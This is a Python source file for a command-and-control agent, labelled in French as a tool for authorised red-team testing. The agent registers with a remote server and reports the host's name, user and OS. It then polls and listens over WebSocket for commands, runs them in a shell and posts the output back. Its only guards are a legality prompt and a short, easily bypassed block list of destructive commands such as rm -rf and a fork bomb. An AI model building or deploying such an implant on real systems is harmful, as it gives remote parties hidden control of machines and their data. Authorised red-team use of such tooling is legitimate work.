#!/usr/bin/env python3
"""
Agent C2 Client pour tests internes et red teaming l√©gal
USAGE L√âGAL UNIQUEMENT - Tests de s√©curit√© autoris√©s
"""

import requests
import json
import time
import subprocess
import platform
import socket
import getpass
import os
import base64
import threading
from datetime import datetime
import socketio

class C2Agent:
    def __init__(self, c2_server_url):
        self.c2_server_url = c2_server_url.rstrip('/')
        self.agent_id = None
        self.encryption_key = None
        self.running = False
        self.sio = None
        
        # Informations syst√®me
        self.hostname = socket.gethostname()
        self.username = getpass.getuser()
        self.os_info = f"{platform.system()} {platform.release()}"
        self.capabilities = [
            'command_execution',
            'file_operations',
            'system_info',
            'network_discovery'
        ]
    
    def register(self):
        """Enregistrement aupr√®s du serveur C2"""
        try:
            registration_data = {
                'hostname': self.hostname,
                'username': self.username,
                'os_info': self.os_info,
                'capabilities': self.capabilities
            }
            
            response = requests.post(
                f"{self.c2_server_url}/api/agent/register",
                json=registration_data,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.agent_id = data['agent_id']
                self.encryption_key = data['encryption_key']
                
                print(f"[‚úÖ] Agent enregistr√© avec succ√®s")
                print(f"[‚ÑπÔ∏è] Agent ID: {self.agent_id}")
                return True
            else:
                print(f"[‚ùå] Erreur d'enregistrement: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[‚ùå] Erreur de connexion: {e}")
            return False
    
    def connect_websocket(self):
        """Connexion WebSocket pour communication temps r√©el"""
        try:
            self.sio = socketio.Client()
            
            @self.sio.event
            def connect():
                print("[‚úÖ] WebSocket connect√©")
                self.sio.emit('join_agent', {'agent_id': self.agent_id})
            
            @self.sio.event
            def disconnect():
                print("[‚ö†Ô∏è] WebSocket d√©connect√©")
            
            @self.sio.event
            def new_command(data):
                print(f"[üì®] Nouvelle commande re√ßue: {data['command']}")
                result = self.execute_command(data['command'])
                self.submit_result(data['command_id'], result)
            
            self.sio.connect(self.c2_server_url)
            return True
            
        except Exception as e:
            print(f"[‚ùå] Erreur WebSocket: {e}")
            return False
    
    def checkin(self):
        """Check-in p√©riodique avec le serveur"""
        try:
            response = requests.post(
                f"{self.c2_server_url}/api/agent/{self.agent_id}/checkin",
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                commands = data.get('commands', [])
                
                print(f"[üì°] Check-in r√©ussi - {len(commands)} commande(s) en attente")
                
                # Ex√©cuter les commandes en attente
                for cmd in commands:
                    print(f"[‚ö°] Ex√©cution: {cmd['command']}")
                    result = self.execute_command(cmd['command'])
                    self.submit_result(cmd['id'], result)
                
                return True
            else:
                print(f"[‚ùå] Check-in √©chou√©: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[‚ùå] Erreur check-in: {e}")
            return False
    
    def execute_command(self, command):
        """Ex√©cution s√©curis√©e des commandes"""
        try:
            print(f"[‚ö°] Ex√©cution: {command}")
            
            # Commandes syst√®me s√©curis√©es
            if command.startswith('cd '):
                try:
                    path = command[3:].strip()
                    os.chdir(path)
                    return f"R√©pertoire chang√© vers: {os.getcwd()}"
                except Exception as e:
                    return f"Erreur cd: {str(e)}"
            
            # Commandes syst√®me standard
            elif command in ['pwd', 'whoami', 'hostname']:
                if command == 'pwd':
                    return os.getcwd()
                elif command == 'whoami':
                    return getpass.getuser()
                elif command == 'hostname':
                    return socket.gethostname()
            
            # Info syst√®me
            elif command == 'sysinfo':
                info = {
                    'hostname': socket.gethostname(),
                    'username': getpass.getuser(),
                    'os': platform.system(),
                    'release': platform.release(),
                    'architecture': platform.architecture()[0],
                    'processor': platform.processor(),
                    'python_version': platform.python_version()
                }
                return json.dumps(info, indent=2)
            
            # Commandes shell g√©n√©riques (avec restrictions)
            else:
                # Liste des commandes dangereuses interdites
                forbidden_commands = [
                    'rm -rf', 'format', 'del /f', 'shutdown', 'reboot',
                    'mkfs', 'dd if=', ':(){ :|:& };:', 'chmod 777 /'
                ]
                
                # V√©rifier les commandes interdites
                if any(forbidden in command.lower() for forbidden in forbidden_commands):
                    return "‚ùå Commande interdite pour des raisons de s√©curit√©"
                
                # Ex√©cuter la commande avec timeout
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    cwd=os.getcwd()
                )
                
                output = result.stdout
                if result.stderr:
                    output += f"\nSTDERR: {result.stderr}"
                
                return output if output else f"Commande ex√©cut√©e (code de retour: {result.returncode})"
                
        except subprocess.TimeoutExpired:
            return "‚ùå Timeout: Commande interrompue apr√®s 30 secondes"
        except Exception as e:
            return f"‚ùå Erreur d'ex√©cution: {str(e)}"
    
    def submit_result(self, command_id, result):
        """Soumission du r√©sultat d'une commande"""
        try:
            response = requests.post(
                f"{self.c2_server_url}/api/agent/{self.agent_id}/result",
                json={
                    'command_id': command_id,
                    'result': result
                },
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[‚úÖ] R√©sultat envoy√© pour la commande {command_id}")
                return True
            else:
                print(f"[‚ùå] Erreur envoi r√©sultat: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[‚ùå] Erreur soumission: {e}")
            return False
    
    def run(self):
        """Boucle principale de l'agent"""
        print(f"üöÄ D√©marrage de l'agent C2")
        print(f"üéØ Serveur: {self.c2_server_url}")
        print(f"üíª H√¥te: {self.hostname} ({self.username})")
        print(f"üñ•Ô∏è OS: {self.os_info}")
        print("‚ö†Ô∏è USAGE L√âGAL UNIQUEMENT - Tests de s√©curit√© autoris√©s")
        print("-" * 60)
        
        # Enregistrement
        if not self.register():
            print("[‚ùå] Impossible de s'enregistrer. Arr√™t.")
            return
        
        # Connexion WebSocket (optionnelle)
        websocket_connected = self.connect_websocket()
        if websocket_connected:
            print("[‚úÖ] Mode temps r√©el activ√©")
        else:
            print("[‚ö†Ô∏è] Mode polling uniquement")
        
        self.running = True
        
        try:
            while self.running:
                # Check-in p√©riodique (m√™me en mode WebSocket pour la robustesse)
                self.checkin()
                
                # Attendre avant le prochain check-in
                time.sleep(30)  # Check-in toutes les 30 secondes
                
        except KeyboardInterrupt:
            print("\n[üõë] Arr√™t demand√© par l'utilisateur")
        except Exception as e:
            print(f"[‚ùå] Erreur fatale: {e}")
        finally:
            self.stop()
    
    def stop(self):
        """Arr√™t propre de l'agent"""
        print("[üõë] Arr√™t de l'agent...")
        self.running = False
        
        if self.sio and self.sio.connected:
            self.sio.disconnect()
        
        print("[‚úÖ] Agent arr√™t√©")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Agent C2 pour tests de s√©curit√© l√©gaux')
    parser.add_argument('--server', default='http://localhost:5000', 
                       help='URL du serveur C2 (d√©faut: http://localhost:5000)')
    parser.add_argument('--test', action='store_true',
                       help='Mode test avec commandes automatiques')
    
    args = parser.parse_args()
    
    # Banni√®re de s√©curit√©
    print("=" * 60)
    print("üõ°Ô∏è AGENT C2 POUR TESTS DE S√âCURIT√â L√âGAUX")
    print("‚ö†Ô∏è Usage autoris√© uniquement pour:")
    print("   ‚Ä¢ Tests de s√©curit√© internes")
    print("   ‚Ä¢ Exercices Red Team autoris√©s")
    print("   ‚Ä¢ Recherche en cybers√©curit√©")
    print("=" * 60)
    
    # Demander confirmation
    confirm = input("\nConfirmez-vous l'usage l√©gal et autoris√©? (oui/non): ")
    if confirm.lower() not in ['oui', 'yes', 'y', 'o']:
        print("‚ùå Usage non confirm√©. Arr√™t.")
        return
    
    # Cr√©er et lancer l'agent
    agent = C2Agent(args.server)
    
    if args.test:
        print("\nüß™ Mode test activ√© - Commandes automatiques apr√®s 10 secondes")
        
        def test_commands():
            time.sleep(10)
            test_cmds = ['whoami', 'pwd', 'sysinfo', 'ls -la' if os.name != 'nt' else 'dir']
            
            for cmd in test_cmds:
                if agent.agent_id:
                    print(f"\nüß™ Test automatique: {cmd}")
                    result = agent.execute_command(cmd)
                    print(f"R√©sultat: {result}")
                time.sleep(5)
        
        # Lancer les tests en arri√®re-plan
        test_thread = threading.Thread(target=test_commands)
        test_thread.daemon = True
        test_thread.start()
    
    # Lancer l'agent
    agent.run()

if __name__ == '__main__':
    main()
